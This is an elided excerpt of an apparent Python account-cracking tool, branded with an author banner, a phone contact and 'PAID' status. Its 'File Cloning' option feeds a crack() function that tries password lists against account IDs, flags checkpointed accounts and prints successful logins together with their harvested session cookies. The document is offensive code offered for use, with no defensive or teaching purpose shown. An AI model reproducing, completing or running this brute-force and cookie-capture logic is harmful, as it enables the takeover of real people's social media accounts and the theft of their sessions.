...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mTusher')
...
while attemps < 12345677901:
    ...
    if username == 'user' and password == 'Tusher12':
...
os.system('espeak -a 300 " Welcome,   to,  my,  Tools,  I, am, Tusher"')
...
\33[1;96m╔═════════════════════════════════════════╗
\033[93m ║ AUTHOR > \x1b[1;91mMD Tusher
\033[32m ║ FB > \x1b[1;97mTusher
\033[95m ║ GITHUB > \x1b[0;34mTusher-12
\33[1;96m ║ CONTACT > \033[93m 01856321936\033[95m [√] \033[95m WHATSAPP ///
\033[93m ║ TOOL  STATUS > \33[1;96mPAID
\33[1;96m╚═════════════════════════════════════════╝""")
def login():
	#print(logo)
	banner()
	Tusherj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	Tusherj('\033[0;97m===============================================')
	Tusher= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if Tusher in ['m']:
		public()
	elif Tusher in ['1']:
		crack_file()
		...
		os.system('xdg-open https://wa.me/+01856321936')
	elif Tusher in ['0']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[Tusher-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#Tusher-
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•Tusher-Cp] {idf} • {pw}')     
				...
				#Tusher-
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•Tusher-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m══════════════════════════════════════════════╗')
				os.system('espeak -a 300 " Tusher,  Ok,  id"')
